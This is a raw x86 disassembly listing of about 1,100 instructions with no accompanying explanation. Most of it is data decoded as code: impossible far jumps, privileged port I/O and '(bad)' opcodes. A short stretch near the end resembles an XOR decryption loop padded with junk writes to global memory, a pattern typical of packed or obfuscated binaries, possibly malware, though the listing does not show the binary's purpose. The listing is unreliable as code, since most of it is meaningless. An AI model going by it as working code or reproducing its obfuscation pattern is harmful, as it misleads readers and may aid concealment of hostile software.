  4041f7:	fild   QWORD PTR [ebp-0x3b]
  4041fa:	push   eax
  4041fb:	xor    ah,0x4e
  4041fe:	ror    BYTE PTR ds:0xae84c01f,cl
  404204:	cli    
  404205:	or     eax,0xffffffde
  404208:	xor    DWORD PTR [ecx-0x3b],ecx
  40420b:	loope  0x4041f6
  40420d:	add    DWORD PTR [ecx-0xb],esi
  404210:	adc    eax,0x5ec871b1
  404215:	pushf  
  404216:	or     DWORD PTR [esi+0x67c74be3],edi
  40421c:	add    BYTE PTR [esp+ebp*2-0x7447e8c],cl
  404223:	xor    eax,0xa10a4219
  404228:	aas    
  404229:	lea    ebp,[eax]
  40422b:	inc    edi
  40422c:	mov    DWORD PTR [esi-0x773d3bd5],ecx
  404232:	sar    ch,0xad
  404235:	pop    ebp
  404236:	dec    ebp
  404237:	sbb    ecx,DWORD PTR [edx+0x40]
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fd6e,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	maskmovq mm6,(bad)
  404258:	div    DWORD PTR [edx+0x184f8ec8]
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0x2a70707d
  404265:	in     eax,dx
  404266:	and    al,0x22
  404268:	mov    edi,0x1401b9c9
  40426d:	outs   dx,BYTE PTR ds:[esi]
  40426e:	fldenv [edx]
  404270:	push   ebp
  404271:	pop    esp
  404272:	xchg   edi,eax
  404273:	dec    ecx
  404274:	dec    ecx
  404275:	pop    edx
  404276:	mov    edi,0xaa8eb4e5
  40427b:	jmp    0x4042ec
  40427d:	js     0x4042df
  40427f:	xchg   BYTE PTR [ebx+eiz*2],bh
  404282:	mov    ebp,0xd50d082e
  404287:	add    DWORD PTR [esi],eax
  404289:	sbb    eax,0xab0bd963
  40428e:	into   
  40428f:	std    
  404290:	jmp    0x4186:0x4d115e24
  404297:	push   cs
  404298:	dec    ecx
  404299:	not    DWORD PTR [ebp-0x7a]
  40429c:	add    ah,BYTE PTR [edx-0x3ce20723]
  4042a2:	scas   al,BYTE PTR es:[edi]
  4042a3:	lock jmp 0x4eaf:0xab34ca91
  4042ab:	das    
  4042ac:	(bad)  
  4042ad:	stc    
  4042ae:	xchg   edi,eax
  4042af:	push   ecx
  4042b0:	sbb    al,0xa3
  4042b2:	sub    ebx,DWORD PTR [edi]
  4042b4:	icebp  
  4042b5:	not    DWORD PTR [esp+ebx*4]
  4042b8:	ror    ch,0x84
  4042bb:	fs push es
  4042bd:	jmp    0xdaf0:0xefb11f32
  4042c4:	dec    ecx
  4042c5:	xor    bl,dh
  4042c7:	mov    al,ds:0x40962bd
  4042cc:	popa   
  4042cd:	mov    bh,0x66
  4042cf:	inc    ecx
  4042d0:	push   ds
  4042d1:	jb     0x404289
  4042d3:	das    
  4042d4:	cmp    eax,0x6f516170
  4042d9:	rol    esi,1
  4042db:	xchg   ebp,eax
  4042dc:	mov    ds:0x2e66e9e4,al
  4042e1:	les    ebp,FWORD PTR [edi+ebx*8-0x5613998c]
  4042e8:	das    
  4042e9:	push   ebx
  4042ea:	push   esp
  4042eb:	pop    ds
  4042ec:	shl    DWORD PTR [ebx+0x1e],0x60
  4042f0:	es add al,0x59
  4042f3:	or     BYTE PTR [ebx+0x14],ah
  4042f6:	pop    es
  4042f7:	mov    WORD PTR [edi],cs
  4042f9:	(bad)  
  4042fa:	lods   al,BYTE PTR ds:[esi]
  4042fb:	out    0x60,al
  4042fd:	mov    eax,0x47a285cb
  404302:	leave  
  404303:	sar    DWORD PTR [ebp+0xd],0x70
  404307:	xchg   esp,eax
  404308:	cmp    al,al
  40430a:	pop    esp
  40430b:	mov    cl,0x59
  40430d:	cmp    al,0x3d
  40430f:	fstp   st(0)
  404311:	inc    eax
  404312:	adc    dh,BYTE PTR [esi]
  404314:	push   ebx
  404315:	cmp    ebp,eax
  404317:	jle    0x4042c2
  404319:	loope  0x404364
  40431b:	add    eax,0x9348aa2b
  404320:	mov    WORD PTR [edx],fs
  404322:	or     eax,0x7e4702b1
  404327:	cmp    BYTE PTR [edi+0x5157b1ad],dh
  40432d:	adc    al,0x1e
  40432f:	adc    bl,BYTE PTR [edi]
  404331:	pop    ds
  404332:	or     DWORD PTR [ecx+0x6dc20834],ebx
  404338:	xchg   esi,eax
  404339:	ja     0x4042fb
  40433b:	push   esp
  40433c:	fmul   DWORD PTR [edi+0x5e]
  40433f:	jo     0x404385
  404341:	push   ebp
  404342:	pop    ecx
  404343:	mov    eax,0x919046a2
  404348:	sub    ah,BYTE PTR [esp+ebp*8]
  40434b:	ins    DWORD PTR es:[edi],dx
  40434c:	and    DWORD PTR ds:0xbf9d6f5a,edi
  404352:	std    
  404353:	adc    BYTE PTR ds:0xd2f63ac0,dl
  404359:	push   ebp
  40435a:	lahf   
  40435b:	lods   eax,DWORD PTR ds:[esi]
  40435c:	pop    ebx
  40435d:	mov    edi,0xc90f392e
  404362:	shl    BYTE PTR [ebx-0x5d],cl
  404365:	pop    edi
  404366:	rcl    DWORD PTR [esi-0x46],cl
  404369:	imul   ebp,eax,0x2a
  40436c:	xchg   esp,eax
  40436d:	mov    esi,DWORD PTR [ebp+esi*1+0x3bbc8c57]
  404374:	inc    esi
  404375:	inc    edx
  404376:	sbb    al,0xe0
  404378:	jmp    0xf7cd:0x7548c4de
  40437f:	loope  0x404319
  404381:	clc    
  404382:	retf   
  404383:	or     ecx,DWORD PTR [ebx+edx*8-0x6b230031]
  40438a:	inc    ecx
  40438b:	dec    edx
  40438c:	jmp    0x40439a
  40438e:	adc    al,0x33
  404390:	or     eax,0x4d7964ed
  404395:	xor    eax,0x58bbdd45
  40439a:	push   esp
  40439b:	aad    0x17
  40439d:	sub    BYTE PTR [eax+edi*8-0x57ba2b72],dh
  4043a4:	mov    BYTE PTR [esi-0x34],ah
  4043a7:	inc    ebp
  4043a8:	cdq    
  4043a9:	jnp    0x4043b5
  4043ab:	arpl   WORD PTR ds:0xe69d23ec,dx
  4043b1:	sub    eax,0xdca7d827
  4043b6:	ror    BYTE PTR [edi],1
  4043b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043b9:	rcr    BYTE PTR [edi+0x18],0xa6
  4043bd:	repz push ds
  4043bf:	out    dx,eax
  4043c0:	mov    cl,0xe2
  4043c2:	mov    BYTE PTR [ebx+0x1a],ch
  4043c5:	test   DWORD PTR [ecx+eax*2-0x10],0x695f8c89
  4043cd:	lods   eax,DWORD PTR es:[esi]
  4043cf:	xor    bh,cl
  4043d1:	(bad)  
  4043d3:	pop    ss
  4043d4:	rcr    BYTE PTR [eax+edi*4],cl
  4043d7:	mov    al,ds:0xa0578d56
  4043dc:	inc    BYTE PTR [ebx-0x11]
  4043df:	jmp    0x40cc339c
  4043e4:	int3   
  4043e5:	sub    ebx,DWORD PTR [edx-0xe]
  4043e8:	outs   dx,BYTE PTR ds:[esi]
  4043e9:	and    bl,BYTE PTR [edi+0x5eafd853]
  4043ef:	shl    esi,0x7c
  4043f2:	nop
  4043f3:	stos   DWORD PTR es:[edi],eax
  4043f4:	out    0x2e,al
  4043f6:	in     eax,dx
  4043f7:	sti    
  4043f8:	mov    ah,0x5
  4043fa:	sub    ebx,edx
  4043fc:	xlat   BYTE PTR ds:[ebx]
  4043fd:	(bad)  
  4043fe:	loopne 0x4043fb
  404400:	add    ch,cl
  404402:	shl    DWORD PTR [ebx+0x40],0x30
  404406:	xchg   edi,eax
  404407:	push   esp
  404408:	sbb    BYTE PTR [edi],0x4e
  40440b:	rcr    DWORD PTR [ebx-0x3132161d],cl
  404411:	dec    edx
  404412:	adc    eax,0xf752c0d9
  404417:	ds pop ebp
  404419:	cdq    
  40441a:	inc    eax
  40441b:	arpl   WORD PTR [edi+0x22dfe2f6],cx
  404421:	test   eax,ebx
  404423:	mov    ds:0xd6ea3c74,al
  404428:	sub    DWORD PTR [ebx],ebp
  40442a:	mov    edi,0xb173eaf6
  40442f:	ins    DWORD PTR es:[edi],dx
  404430:	xchg   ebp,eax
  404431:	jns    0x404469
  404433:	xchg   ebp,eax
  404434:	xchg   DWORD PTR [eax+0x35442c1d],esp
  40443a:	enter  0xf552,0x71
  40443e:	mov    al,ds:0x290bcf8c
  404443:	sbb    bh,bh
  404445:	cwde   
  404446:	je     0x404492
  404448:	mov    eax,ds:0x16cccdba
  40444d:	retf   
  40444e:	mov    eax,ds:0xc8338ddb
  404453:	ret    
  404454:	scas   eax,DWORD PTR es:[edi]
  404455:	lahf   
  404456:	adc    bl,BYTE PTR [esi-0x4bda50de]
  40445c:	cmp    BYTE PTR [ebp-0x69],dl
  40445f:	out    0xa2,al
  404461:	aad    0x5d
  404463:	aam    0x7
  404465:	mov    ah,cl
  404467:	jae    0x4044a1
  404469:	int3   
  40446a:	pop    ds
  40446b:	jl     0x4044da
  40446d:	pop    edx
  40446e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40446f:	mov    esp,0x615c5f88
  404474:	gs jae 0x404459
  404477:	sti    
  404478:	mov    bl,0xac
  40447a:	test   al,0x97
  40447c:	in     eax,0x6b
  40447e:	ret    0xb
  404481:	adc    dl,BYTE PTR [esi-0x48]
  404484:	ret    0xde91
  404487:	fst    DWORD PTR [esi]
  404489:	sub    BYTE PTR [eax],bh
  40448b:	mov    bh,0x2a
  40448d:	cwde   
  40448e:	lds    ecx,FWORD PTR [eax]
  404490:	aas    
  404491:	mov    ah,0x48
  404493:	inc    esp
  404494:	ins    DWORD PTR es:[edi],dx
  404495:	xchg   esi,eax
  404496:	ins    DWORD PTR es:[edi],dx
  404497:	lods   eax,DWORD PTR ds:[esi]
  404498:	xchg   DWORD PTR [edi+0xd],ecx
  40449b:	and    ah,BYTE PTR [ebx]
  40449d:	sbb    al,0xe5
  40449f:	adc    al,BYTE PTR [esi+0x5af5cc4b]
  4044a5:	daa    
  4044a6:	or     ch,BYTE PTR [eax+0xe]
  4044a9:	dec    esi
  4044aa:	add    BYTE PTR [edx],dl
  4044ac:	jg     0x4044f4
  4044ae:	ds dec edi
  4044b0:	fisubr DWORD PTR [ecx-0x5c]
  4044b3:	(bad)  [esp+ecx*2]
  4044b6:	mov    al,0x65
  4044b8:	pop    ss
  4044b9:	pop    esi
  4044ba:	hlt    
  4044bb:	xor    BYTE PTR [edi-0x5],al
  4044be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044bf:	adc    al,BYTE PTR [ebx-0x59]
  4044c2:	add    DWORD PTR [ecx],edi
  4044c4:	sub    BYTE PTR [eax],al
  4044c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c7:	jmp    0x7e71:0x2a33f7a4
  4044ce:	mov    ebp,0x1023630c
  4044d3:	mov    al,dh
  4044d5:	jp     0x404472
  4044d7:	mov    eax,0x6cac8927
  4044dc:	cli    
  4044dd:	pop    ds
  4044de:	and    esp,ecx
  4044e0:	stos   DWORD PTR es:[edi],eax
  4044e1:	mov    esi,0x3b62168a
  4044e6:	sbb    dh,dl
  4044e8:	loope  0x404514
  4044ea:	test   DWORD PTR [eax],ebp
  4044ec:	int    0x3b
  4044ee:	scas   al,BYTE PTR es:[edi]
  4044ef:	dec    esi
  4044f0:	imul   ecx,DWORD PTR [esp-0x4b],0x11bf5674
  4044f8:	in     eax,0xf4
  4044fa:	enter  0xabfc,0xf0
  4044fe:	int3   
  4044ff:	out    dx,al
  404500:	test   DWORD PTR [ebx-0x53],esi
  404503:	or     al,0x84
  404505:	xor    bl,BYTE PTR [ecx]
  404507:	loop   0x404506
  404509:	mov    BYTE PTR [edi-0x17],ah
  40450c:	adc    edx,DWORD PTR [eax]
  40450e:	mov    bl,0xd4
  404510:	inc    edi
  404511:	cmp    eax,0xad368b9c
  404516:	hlt    
  404517:	fs jne 0x404558
  40451a:	in     eax,0x4d
  40451c:	or     ch,bl
  40451e:	into   
  40451f:	push   ebx
  404520:	sbb    al,0xd7
  404522:	xor    dh,BYTE PTR [edx-0x45ca3a61]
  404528:	push   0xffffffc8
  40452a:	out    0xae,al
  40452c:	arpl   WORD PTR [edi],bx
  40452e:	xlat   BYTE PTR ds:[ebx]
  40452f:	pop    edx
  404530:	inc    esp
  404531:	sbb    bl,BYTE PTR [ebx+0x73ca3395]
  404537:	push   cs
  404538:	cmp    DWORD PTR [esi+0x7a9279b6],0x2d561f50
  404542:	mov    fs,WORD PTR [esi+0x7da8a93e]
  404548:	inc    edx
  404549:	jno    0x4044e8
  40454b:	test   eax,0xb0c1310f
  404550:	das    
  404551:	mov    eax,0x95feaa8f
  404556:	mov    ecx,0xb2f8222e
  40455b:	sub    al,0x21
  40455d:	mov    bl,0x21
  40455f:	cld    
  404560:	mov    dl,0x85
  404562:	mov    fs,WORD PTR [eax+0x472a90c0]
  404568:	inc    edx
  404569:	call   0x20ba1d34
  40456e:	es enter 0x3e31,0x5c
  404573:	test   BYTE PTR [ebp-0x39],cl
  404576:	jno    0x40458b
  404578:	ret    0xd6f7
  40457b:	repnz xor al,0xd3
  40457e:	loopne 0x4045f6
  404580:	(bad)  
  404581:	sub    ah,dl
  404583:	mov    edi,0xe82c170a
  404588:	imul   edx,DWORD PTR [edi+0x61],0x29
  40458c:	fdivp  st(3),st
  40458e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40458f:	push   ebx
  404590:	repz pop es
  404592:	cwde   
  404593:	pop    ebx
  404594:	mov    ch,0x3f
  404596:	sbb    DWORD PTR [edx+0x3b],0xc7baa51c
  40459d:	ret    
  40459e:	mov    esp,0x9b9a93b4
  4045a3:	lds    ecx,FWORD PTR [eax+ebp*2+0x2]
  4045a7:	jb     0x403ebe
  4045ad:	and    DWORD PTR ds:0x42fd82,edx
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	lahf   
  4045c8:	in     al,0xb9
  4045ca:	in     eax,dx
  4045cb:	or     al,0x24
  4045cd:	jo     0x40463f
  4045cf:	cmp    eax,0xf070707d
  4045d4:	fwait
  4045d5:	jmp    0x3803:0x74ce2aa8
  4045dc:	and    DWORD PTR [ebx+0x2773d3ed],ecx
  4045e2:	mov    ds:0x27d0e062,eax
  4045e7:	ret    
  4045e8:	dec    ecx
  4045e9:	cld    
  4045ea:	lods   al,BYTE PTR ds:[esi]
  4045eb:	cmp    eax,0xa4b036b1
  4045f0:	ins    BYTE PTR es:[edi],dx
  4045f1:	(bad)  
  4045f2:	mov    BYTE PTR [ebx+0x158dffd4],ch
  4045f8:	outs   dx,BYTE PTR ds:[esi]
  4045f9:	push   esi
  4045fa:	pop    ss
  4045fb:	lea    ebp,[esi-0x7be37ac7]
  404601:	outs   dx,BYTE PTR ds:[esi]
  404602:	aas    
  404603:	test   DWORD PTR [ebx],0x954bbc2b
  404609:	mov    bl,BYTE PTR [eax]
  40460b:	mov    dh,0x79
  40460d:	inc    edx
  40460e:	jne    0x4045ed
  404610:	push   edi
  404611:	bound  ebx,QWORD PTR [bp+di+0x76d0]
  404616:	cmp    DWORD PTR [esi],ebp
  404618:	add    dl,BYTE PTR [ecx]
  40461a:	retf   0xc5fa
  40461d:	lods   eax,DWORD PTR ds:[esi]
  40461e:	mov    eax,0x43f8a7a9
  404623:	add    bl,BYTE PTR [esi]
  404625:	sbb    DWORD PTR [edx],eax
  404627:	or     DWORD PTR [edi-0x17],eax
  40462a:	enter  0x2e18,0xbf
  40462e:	repnz push ecx
  404630:	adc    al,BYTE PTR [ebp+0x798af796]
  404636:	fwait
  404637:	xchg   ecx,eax
  404638:	bound  esp,QWORD PTR [ebx+0x673f462f]
  40463e:	sbb    ecx,edx
  404640:	mov    edi,0xf36508b1
  404645:	inc    dh
  404647:	sub    eax,0x1d19b2ab
  40464c:	aas    
  40464d:	sub    bl,BYTE PTR [ebx+ecx*4+0x36]
  404651:	mov    edi,0xbc4d46b5
  404656:	je     0x4046a8
  404658:	out    0xe6,eax
  40465a:	jl     0x4045fb
  40465c:	mov    ebx,0x24a1304c
  404661:	push   ebx
  404662:	pop    esp
  404663:	push   edx
  404664:	loope  0x404692
  404666:	mov    eax,ds:0x83f9837f
  40466b:	shl    DWORD PTR cs:[ebx],1
  40466e:	sub    eax,0x6ef140b2
  404673:	push   ds
  404674:	inc    esp
  404675:	dec    eax
  404676:	aas    
  404677:	cs xchg bp,ax
  40467a:	clc    
  40467b:	shr    dh,1
  40467d:	mov    eax,DWORD PTR [edi-0x60c8b841]
  404683:	mov    DWORD PTR [ebx],eax
  404685:	xor    DWORD PTR [ebp+esi*8-0x18f02df2],edx
  40468c:	inc    esi
  40468d:	push   0xffffff86
  40468f:	inc    ebx
  404690:	sub    ch,BYTE PTR [edi]
  404692:	cli    
  404693:	jge    0x40462b
  404695:	xlat   BYTE PTR ds:[ebx]
  404696:	xor    al,0xae
  404698:	jp     0x4046e5
  40469a:	fiadd  DWORD PTR [ebp-0x30eef92f]
  4046a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046a1:	dec    BYTE PTR [ebx+0x29]
  4046a4:	int3   
  4046a5:	(bad)  [edx]
  4046a7:	(bad)  
  4046a8:	or     eax,0xd4b08ca4
  4046ad:	inc    ebx
  4046ae:	jle    0x404723
  4046b0:	fs mov esp,0x9e5c6c68
  4046b6:	mov    BYTE PTR [esi+0x427f3ca1],0xe3
  4046bd:	jg     0x4046d4
  4046bf:	out    dx,eax
  4046c0:	jmp    0xa9a779fa
  4046c5:	mov    eax,edi
  4046c7:	iret   
  4046c8:	pop    esi
  4046c9:	pand   mm5,QWORD PTR [esp+edi*2]
  4046cd:	xor    dl,BYTE PTR [esi+0x4d9bc8dd]
  4046d3:	stos   DWORD PTR es:[edi],eax
  4046d4:	xchg   ecx,eax
  4046d5:	adc    esi,ebp
  4046d7:	scas   al,BYTE PTR es:[edi]
  4046d8:	mov    ebp,0xd7958806
  4046dd:	xchg   DWORD PTR [edi+0x4d],ebp
  4046e0:	cli    
  4046e1:	jecxz  0x404726
  4046e3:	xchg   esp,eax
  4046e4:	imul   esp,DWORD PTR [ebx],0xa058d2c7
  4046ea:	push   ebp
  4046eb:	in     eax,dx
  4046ec:	hlt    
  4046ed:	scas   eax,DWORD PTR es:[edi]
  4046ee:	jbe    0x40475d
  4046f0:	inc    ebx
  4046f1:	ins    BYTE PTR es:[edi],dx
  4046f2:	retf   0x9460
  4046f5:	loop   0x4046fb
  4046f7:	ja     0x40470c
  4046f9:	mov    al,ds:0x3e984b8e
  4046fe:	aam    0xa5
  404700:	bts    DWORD PTR [esi+0x54930ae5],0xdc
  404708:	jg     0x4046f4
  40470a:	mov    dl,bh
  40470c:	outs   dx,BYTE PTR ds:[esi]
  40470d:	mov    eax,ds:0x5fec5c07
  404712:	mov    dh,BYTE PTR [edi-0x4c50a95a]
  404718:	dec    ebp
  404719:	jo     0x40472d
  40471b:	pop    edi
  40471c:	(bad)  
  40471d:	lock cli 
  40471f:	popf   
  404720:	es inc eax
  404722:	repz adc al,0xe5
  404725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404726:	xlat   BYTE PTR ds:[ebx]
  404727:	xor    dl,BYTE PTR [esi]
  404729:	add    cl,ah
  40472b:	mov    ch,BYTE PTR [ebx]
  40472d:	sbb    eax,0xff916ab
  404732:	iret   
  404733:	mov    ah,0x55
  404735:	call   WORD PTR [ebp+0x190d136]
  40473c:	jo     0x40475c
  40473e:	mov    al,ds:0x3eb6ea99
  404743:	loopne 0x4046db
  404745:	add    dl,BYTE PTR [esi]
  404747:	inc    edi
  404748:	(bad)  
  404749:	mov    dh,0x7a
  40474b:	and    DWORD PTR [eax-0x37],0x55
  40474f:	mov    ch,0x92
  404751:	in     eax,0xb8
  404753:	in     eax,dx
  404754:	sub    DWORD PTR [esi+0x40b83c6],esp
  40475a:	dec    ebp
  40475b:	xor    al,0x7b
  40475d:	dec    ecx
  40475e:	and    al,0x27
  404760:	push   0xffffffd1
  404762:	jecxz  0x404787
  404764:	dec    edx
  404765:	std    
  404766:	aam    0x80
  404768:	or     eax,DWORD PTR [ebx+ebx*4]
  40476b:	popf   
  40476c:	out    0xf2,al
  40476e:	jno    0x404762
  404770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404771:	lahf   
  404772:	xchg   ch,bl
  404774:	and    al,0x60
  404776:	fsubr  DWORD PTR [ebx-0x1eb70835]
  40477c:	leave  
  40477d:	push   esi
  40477e:	inc    ebx
  40477f:	dec    ebp
  404780:	jns    0x4047a0
  404782:	(bad)  
  404783:	cli    
  404784:	lock lock into 
  404787:	mov    ds:0x1aba5d71,eax
  40478c:	mov    al,ds:0x63175f42
  404791:	aad    0x6c
  404793:	iret   
  404794:	sar    DWORD PTR [ebx+0x78],1
  404797:	mov    edx,0x3c5fa67a
  40479c:	push   ds
  40479d:	adc    BYTE PTR [edi],ch
  40479f:	(bad)  
  4047a0:	mov    ds:0x507cbf1b,eax
  4047a5:	and    cl,ch
  4047a7:	fisub  WORD PTR [edi+0x44]
  4047aa:	sbb    al,0xeb
  4047ac:	icebp  
  4047ad:	jbe    0x404806
  4047af:	ss xchg edx,eax
  4047b1:	jle    0x4047cd
  4047b3:	adc    eax,edi
  4047b5:	psubusb mm0,QWORD PTR [esi-0x36701b1f]
  4047bc:	push   ebx
  4047bd:	xchg   BYTE PTR [eax+0x2f],dh
  4047c0:	lahf   
  4047c1:	repnz mov al,0x21
  4047c4:	stos   BYTE PTR es:[edi],al
  4047c5:	pop    ebx
  4047c6:	xchg   ecx,eax
  4047c7:	jmp    0xe0fd78f4
  4047cc:	ret    0xdca9
  4047cf:	push   0x578f58ef
  4047d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047d5:	push   eax
  4047d6:	sti    
  4047d7:	jge    0x404818
  4047d9:	add    edx,eax
  4047db:	jo     0x404820
  4047dd:	dec    esp
  4047de:	push   ds
  4047df:	add    eax,0x3dc81350
  4047e4:	sub    eax,0xe7757f8b
  4047e9:	out    dx,al
  4047ea:	in     al,0x34
  4047ec:	ss (bad) 
  4047ee:	jle    0x40481f
  4047f0:	aam    0x1
  4047f2:	gs push ebp
  4047f4:	add    bl,BYTE PTR ds:0x2dadc4a8
  4047fa:	push   ebx
  4047fb:	sar    BYTE PTR [edx+0x6872e8a],0xe0
  404802:	cmp    DWORD PTR [esi],ebp
  404804:	cld    
  404805:	mov    al,ds:0x5eae0d9a
  40480a:	loope  0x40486c
  40480c:	mov    bl,0xfa
  40480e:	aaa    
  40480f:	aas    
  404810:	jle    0x404811
  404812:	xlat   BYTE PTR ds:[ebx]
  404813:	push   ebp
  404814:	sti    
  404815:	scas   al,BYTE PTR es:[edi]
  404816:	imul   edi,DWORD PTR [edi+0x70ccaa39],0xb2a0812d
  404820:	es xchg esi,eax
  404822:	ins    BYTE PTR es:[edi],dx
  404823:	dec    ebx
  404824:	xchg   esi,edi
  404826:	sbb    eax,0x10b42bfa
  40482b:	cmp    ah,BYTE PTR [ebx-0x73]
  40482e:	push   0xffffffbd
  404830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404831:	(bad)  
  404832:	inc    edx
  404833:	repz dec esp
  404835:	push   esp
  404836:	sbb    DWORD PTR [edi],ecx
  404838:	cmp    ecx,DWORD PTR [ebx-0x4b]
  40483b:	jmp    0x404846
  40483d:	or     ebx,DWORD PTR [esi+0x7f2fae78]
  404843:	xchg   si,ax
  404845:	out    dx,al
  404846:	xor    DWORD PTR [edx],0xd4a2c691
  40484c:	xchg   DWORD PTR [ebx+0x5cf18934],ebx
  404852:	mov    ebp,0x24f4c22d
  404857:	mov    esi,0xeae903ff
  40485c:	mov    dl,al
  40485e:	adc    al,0xb4
  404860:	jbe    0x4047f4
  404862:	adc    BYTE PTR [eax+0x307a9390],cl
  404868:	dec    edx
  404869:	mov    cl,0x6e
  40486b:	sub    eax,0xbcec2bae
  404870:	add    BYTE PTR [ebp-0x5f],dl
  404873:	arpl   WORD PTR [eax+ebp*8],ax
  404876:	sbb    dh,BYTE PTR [ebp-0x4f]
  404879:	mov    BYTE PTR [ebx+ecx*1+0x3a],ah
  40487d:	stos   DWORD PTR es:[edi],eax
  40487e:	mov    ebp,0x748a3168
  404883:	out    dx,al
  404884:	jecxz  0x40486d
  404886:	xor    BYTE PTR [edx-0x5e],dh
  404889:	test   DWORD PTR [eax],ebx
  40488b:	jne    0x4048a5
  40488d:	cs jp  0x404812
  404890:	leave  
  404891:	jae    0x404827
  404893:	out    dx,al
  404894:	inc    esi
  404895:	pushf  
  404896:	add    eax,DWORD PTR [ecx]
  404898:	test   ebx,eax
  40489a:	out    dx,al
  40489b:	jb     0x217e28a2
  4048a1:	hlt    
  4048a2:	xchg   ebx,eax
  4048a3:	cdq    
  4048a4:	sahf   
  4048a5:	retf   
  4048a6:	mov    ebx,0xa3ba7814
  4048ab:	stc    
  4048ac:	jge    0x404927
  4048ae:	test   DWORD PTR ds:0xfec113f1,ecx
  4048b4:	dec    eax
  4048b5:	pop    ebp
  4048b6:	test   eax,0xa4ba6226
  4048bb:	add    eax,0xbf7e4eec
  4048c0:	std    
  4048c1:	push   edi
  4048c2:	cld    
  4048c3:	nop
  4048c4:	fs add ebx,ebp
  4048c7:	jmp    0xbe44d894
  4048cc:	inc    edi
  4048cd:	fwait
  4048ce:	push   ss
  4048cf:	cmp    BYTE PTR [edi],ah
  4048d1:	jl     0x40492d
  4048d3:	jge    0x404937
  4048d5:	js     0x404930
  4048d7:	sti    
  4048d8:	lods   eax,DWORD PTR ds:[esi]
  4048d9:	mov    bl,0x32
  4048db:	pop    esi
  4048dc:	arpl   WORD PTR [esi+0x7],sp
  4048df:	stc    
  4048e0:	(bad)  
  4048e1:	in     al,dx
  4048e2:	bound  ebp,QWORD PTR [edx]
  4048e4:	mov    dl,0xb9
  4048e6:	cwde   
  4048e7:	sub    ebx,DWORD PTR [esp+ecx*4+0x55]
  4048eb:	ins    BYTE PTR es:[edi],dx
  4048ec:	sar    DWORD PTR [edi-0x3c],cl
  4048ef:	xor    ecx,ebx
  4048f1:	sub    ch,BYTE PTR [eax]
  4048f3:	push   ss
  4048f4:	mov    dl,0x97
  4048f6:	mov    edi,0xfd49d8bb
  4048fb:	loop   0x404943
  4048fd:	pusha  
  4048fe:	mov    dh,0x39
  404900:	pop    esp
  404901:	mov    edx,DWORD PTR ss:0xdc5255f6
  404908:	xchg   edx,eax
  404909:	scas   eax,DWORD PTR es:[edi]
  40490a:	inc    eax
  40490b:	xchg   ebp,eax
  40490c:	fsubr  QWORD PTR [eax+0x1afd42a2]
  404912:	inc    esp
  404913:	hlt    
  404914:	outs   dx,DWORD PTR cs:[esi]
  404916:	mov    eax,DWORD PTR [ebp-0xc]
  404919:	xor    edx,ecx
  40491b:	add    edx,esi
  40491d:	cmp    edx,eax
  40491f:	mov    DWORD PTR ds:0x42e11c,0x6f80
  404929:	je     0x405095
  40492f:	add    DWORD PTR ds:0x42e124,ecx
  404935:	push   ebx
  404936:	adc    DWORD PTR ds:0x42e6ff,ecx
  40493c:	push   edi
  40493d:	mov    edi,DWORD PTR [ebp+0x8]
  404940:	mov    eax,0x8a3e
  404945:	and    DWORD PTR ds:0x42e134,0x5964
  40494f:	xor    ax,WORD PTR [edi+edx*4+0x2]
  404954:	mov    edi,0x3b04
  404959:	add    ax,di
  40495c:	add    DWORD PTR ds:0x42fd05,0x42e134
  404966:	movzx  eax,ax
  404969:	and    DWORD PTR ds:0x42fd7a,0x42fcf9
  404973:	mov    DWORD PTR [ebp-0x14],eax
  404976:	sbb    DWORD PTR ds:0x42fd7e,0xc63
  404980:	mov    eax,DWORD PTR [ebp+0x8]
  404983:	add    DWORD PTR ds:0x42e703,0x6bf6
  40498d:	movzx  eax,WORD PTR [eax+edx*4]
  404991:	sbb    DWORD PTR ds:0x42fd82,0x42fd7e
  40499b:	xor    eax,0x8a3e
  4049a0:	add    DWORD PTR ds:0x42e707,0x26eb
  4049aa:	jmp    0x404d0a
  4049af:	fdiv   QWORD PTR [esi]
  4049b1:	dec    esp
  4049b2:	rsqrtps xmm6,XMMWORD PTR [ecx+0x5b]
  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	shl    DWORD PTR [ecx+0x21c9db33],0x70
  4049c2:	jo     0x404a01
  4049c4:	jge    0x404a36
  4049c6:	jo     0x4049ff
  4049c8:	sub    DWORD PTR ds:0x955bb3ff,ebx
  4049ce:	rcl    BYTE PTR [esi+0x58],cl
  4049d1:	repz ss mov bh,0xcf
  4049d5:	jno    0x4049fa
  4049d7:	sbb    BYTE PTR [edx+ecx*4],0x43
  4049db:	mov    eax,ds:0x19f81b2d
  4049e0:	cmp    al,0x23
  4049e2:	jge    0x4049e8
  4049e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049e5:	sti    
  4049e6:	test   al,0x8
  4049e8:	aad    0x65
  4049ea:	add    DWORD PTR [edi-0x28460ab1],eax
  4049f0:	or     ebx,ecx
  4049f2:	leave  
  4049f3:	out    dx,al
  4049f4:	les    eax,FWORD PTR [ebx+ebx*2+0x4b]
  4049f8:	stc    
  4049f9:	and    ebp,DWORD PTR [eax+0x62030eb6]
  4049ff:	lds    edi,FWORD PTR [eax-0x9910a0e]
  404a05:	mov    cs,esp
